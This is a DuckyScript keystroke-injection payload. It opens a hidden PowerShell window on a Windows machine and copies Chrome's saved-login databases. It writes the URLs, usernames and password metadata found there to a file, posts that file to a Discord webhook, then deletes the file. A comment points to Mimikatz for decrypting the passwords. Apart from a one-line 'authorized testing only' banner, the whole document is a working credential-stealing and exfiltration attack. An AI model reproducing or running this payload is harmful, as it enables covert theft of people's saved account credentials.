REM ============================================
REM Chrome Saved Logins Extractor -> Discord
REM FOR AUTHORIZED PENETRATION TESTING ONLY
REM ============================================
REM Replaces YOUR_DISCORD_WEBHOOK_URL with your webhook

DELAY 500
GUI r
DELAY 200
STRING powershell -WindowStyle Hidden -Command "$f=$env:TEMP+'\chrome_passwords.txt'; 'CHROME SAVED LOGINS' | Out-File $f; 'Generated: '+(Get-Date) | Out-File $f -Append; 'User: '+$env:USERNAME | Out-File $f -Append; '' | Out-File $f -Append; $paths=@($env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data',$env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data For Account'); foreach($db in $paths){ if(Test-Path $db){ '--- '+$db+' ---' | Out-File $f -Append; Copy-Item $db $env:TEMP\ChromeDB -Force; try{ Add-Type -AssemblyName System.Data.SQLite; $conn=New-Object System.Data.SQLite.SQLiteConnection('Data Source='+$env:TEMP+'\ChromeDB'); $conn.Open(); $cmd=$conn.CreateCommand(); $cmd.CommandText='SELECT origin_url, username_value, length(password_value) as pwd_length, datetime(date_created/1000000-11644473600, ''unixepoch'') as created FROM logins'; $reader=$cmd.ExecuteReader(); while($reader.Read()){ $reader['origin_url']+' | '+$reader['username_value']+' | pwd_bytes: '+$reader['pwd_length']+' | created: '+$reader['created'] | Out-File $f -Append }; $conn.Close() } catch { 'Error: '+$_ | Out-File $f -Append }; Remove-Item $env:TEMP\ChromeDB -Force -ErrorAction SilentlyContinue } }; '`nNOTE: Passwords are encrypted by Chrome DPAPI. To decrypt, use the Mimikatz dpapi module or run as the logged-in user with their credentials.' | Out-File $f -Append; $w='YOUR_DISCORD_WEBHOOK_URL'; $msg=@{username='Chrome Extractor'; content='Chrome saved logins from '+$env:COMPUTERNAME+' ('+(Get-Content $f | Measure-Object -Line).Lines+' lines)'}|ConvertTo-Json -Compress; Invoke-RestMethod $w -Method Post -ContentType 'application/json' -Body $msg; Invoke-RestMethod $w -Method Post -Form @{file=Get-Item $f}; Remove-Item $f -Force"
ENTER
